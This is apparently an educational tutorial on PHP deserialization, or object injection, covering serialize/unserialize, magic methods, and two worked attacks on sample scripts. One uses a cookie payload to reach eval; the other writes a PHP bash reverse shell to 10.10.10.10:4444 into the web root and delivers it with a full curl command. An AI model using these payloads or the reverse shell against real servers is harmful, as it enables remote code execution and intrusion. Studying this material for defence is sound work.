# PHP Deserialization Exploitation

## Serialization in php

When a PHP object is stored or transferred over the network, the default serialization method is to use ```serialize()``` to pack it up.

```serialize(): \<PHP object\> => plain string representation of the object```

Here's an example code snippet to demonstrate what PHP serialization looks like:

```php
<?php

class User{
public $username;
public $role;
public $SSN;
}

$user = new User;
$user -> username = 'bob';
$user -> role = 'admin';
$user -> SSN = '199001016666';

print(serialize($user));
?>
```

Running the code we get a serialized string that represents the ```user``` object:

```O:4:"User":3:{s:8:"username";s:3:"bob";s:4:"role";s:5:"admin";s:3:"SSN";s:12:"199001016666";}```

Where O is object and s is string. This is in the format:

```O:LENGTH_OF_OBJ_NAME:"CLASS_NAME":NUMBER_OF_PROPERTIES:{PROPERTIES}```

## Deserialization in php

When the data needs to be used, ```unserialize()``` is used to unpack and get the underlying object.

```unserialize(): \<string containing object data\> => original PHP object```

Here's an example to demonstrate deserialization:

```php
<?php

class User{
public $username;
public $role;
public $SSN;
}

$user = new User;
$user -> username = 'bob';
$user -> role = 'admin';
$user -> SSN = '199001016666';

$serialized = serialize($user);
$unserialized = unserialize($serialized);

var_dump($unserialized);
var_dump($unserialized -> username);
var_dump($unserialized -> role);
var_dump($unserialized -> SSN);
?>
```

This code snippet serializes the ```user``` object, deserializes it and displays its properties one by one. The output is as follows:

```console
object(User)#2 (3) {
  ["username"]=>
  string(3) "bob"
  ["role"]=>
  string(5) "admin"
  ["SSN"]=>
  string(12) "199001016666"
}
string(3) "bob"
string(5) "admin"
string(12) "199001016666"
```

## Exploring the unserialize() method

Let's have a closer look at the unserialize method

### PHP magic methods

PHP magic methods are functions that have special properties. All PHP magic methods are defined [here](https://www.php.net/manual/en/language.oop5.magic.php). The magic methods most relevant to deserialization vulnerabilities is the ```__wakeup()``` method. This method is executed automatically as soon as unserialize() is called on an object.

Essentially, there are 3 broad steps when working with PHP objects. The object is instantiated, some operations are performed on/with the object and finally the object is destroyed:

#### Instantiate object

The ```unserialize()``` method takes a serialized string as input and creates an instance of a class in memory. It then searches for the ```__wakeup()``` function to reconstruct any resources that the object may have. The ```__wakeup()``` method is typically used to reestablish database connections that may have been lost during serialization and to perform other reinitializations.

#### Use object

The object is used by the program and some operations/actions may be performed using it.

#### Destroy object

When no reference to the object exists ```__destruct()``` is called to clean up the object

## Exploiting PHP deserialization

When an attacker has control over a serialized string that is passed into the ```unserialize()``` method, they control the properties of the created object. Another thing that is possible is to control the flow of the program by manipulating the values passed into magic methods such as ```__wakeup()```.

This technique is called PHP object injection. PHP object injection can lead to variable manipulation, RCE, SQL injection etc.

### Modifying properties

One possible way of exploiting a PHP object injection vulnerabilities is modifying the properties in a serialized object and passing that as input. eg. if we have the following serialized object:

```O:4:"User":3:{s:8:"username";s:3:"bob";s:4:"role";s:5:"user";}```

We could potentially pass in the string by changing the ```role``` property which defines the privilege of the username "bob" as follows:

```O:4:"User":3:{s:8:"username";s:3:"bob";s:4:"role";s:5:"admin";}```

### Remote code execution

It may be possible to get RCE using PHP object injection through one of the magic methods. For example if we have the following ```__wakeup()``` function:

```php
function __wakeup(){
      if (isset($this->hook)) eval($this->hook);
  }
```

This function executes whatever is inside the ```hook``` property within the object that is undergoing deserialization. If we were able to control the input to the object undergoing deserialization, we could effectively achieve RCE.

## PHP Object injection examples

PHP object injection attacks occur when the attacker controls the input to a variable that will be deserialized. Extending the usage of the wakeup function above, we have the following vulnerable examples:

### Example 1: RCE through cookie injection

```php
class Example
{
  private $hook;

  function __wakeup(){
      if (isset($this->hook)) eval($this->hook);
  }
}

........

$user_input = unserialize($_COOKIE['data']);
```

In the above example, since the input ```data``` cookie is unserialized, an attacker could set the cookie with a serialized string. The string when unserialized will call the wakeup function and the ```hook``` property will get executed. We could inject this property with malicious code and achieve RCE as follows:

```php
class Example
{
    private $hook = "phpinfo();";
}

print urlencode(serialize(new Example));
```

The URL encoding is done since we would pass this string through a URL. The generated string looks as follows:

Before URL encoding:
```O:7:"Example":1:{s:13:"Examplehook";s:10:"phpinfo();";}```

After URL encoding:
```O%3A7%3A%22Example%22%3A1%3A%7Bs%3A13%3A%22%00Example%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D```

Passing the string above into the ```data``` cookie, the ```phpinfo()``` function will be executed. The flow of the program looks as follows:

1. A serialized ```Example``` object is passed into the program as the ```data``` cookie
2. The program calls ```unserialize()``` on the ```data``` cookie
3. Because the ```data``` cookie is a serialized ```Example``` object, ```unserialize()``` instantiates a new ```Example``` object
4. The magic method ```__wakeup()``` is available so at this point, it is called
5. The ```hook``` property of the object is checked for and if it is not NULL, it is executed through ```eval()```

### Example 2: RCE through variable injection

We have the following vulnerable server side script:

```php
<?php
class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file';
                $this-> data = 'Success';
        }
        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated';
        }
}

$input = $_GET['user_input'] ?? '';
$databaseupdate = unserialize($input);
$app = new DatabaseExport;
$app -> update_db();
?>
```

The script does the following:

1. It takes the variable ```user_input``` as input and ```unserialize()``` is called on it
2. If the input is a serialized ```DataBaseExport``` object, ```unserialize()``` instantiates a new ```DataBaseExport``` object
3. The magic method ```__destruct()``` is available so it is called
4. The ```__destruct()``` method puts the contents of the ```data``` variable on to a filename that is defined by the variable ```user_file```. The file is then copied to the root directory of the web server.
5. Calls the ```update_db()``` method to update the file with the latest data in the ```data``` variable and copies the file to the root directory.

To exploit this we can craft a ```user_input`` input as a serialized object that contains a reverse shell. This input is written as a file to the root directory of the webserver. We can then navigate to that file and execute it. The malicious input can be created as follows:

```php
<?php
class DatabaseExport
{
    public $user_file='revsh.php';
    public $data='<?phpexec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\'"); ?>';
}
print("serialized object:\n");
print(serialize(new DatabaseExport));
print("\n\n");
print("serialized object with encoding:\n");
print(urlencode(serialize(new DatabaseExport)));
?>
```

As shown above, the ```data``` variable contains the reverse shell and the ```user_file``` variable contains the filename of the file that will be placed in the root directory of the server. The output of this snippet is as follows:

```console
serialized object:
O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"revsh.php";s:4:"data";s:73:"<?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'"); ?>";}

serialized object with encoding:
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22revsh.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphpexec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

Now we can pass the encoded string into the ```user_input``` variable as follows:

```console
kali@kali:~$ curl -i http://example.com/server.php?user_input=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22revsh.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphpexec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

This will write the file to the root of the server. The file that's copied (revsh.php) can now be executed simply by navigating to ```http://example.com/revsh.php``` and the reverse shell can be caught with a listener.

## Avoiding deserialization vulnerabilities

1. Input validation: Review the use of the ```unserialize()``` function and ensure that external parameters are handled safely
2. Using standard formats: Use standard data exchange formats such as JSON (via ```json_decode()``` and ```json_encode()```) if you need to pass serialized data to the user.
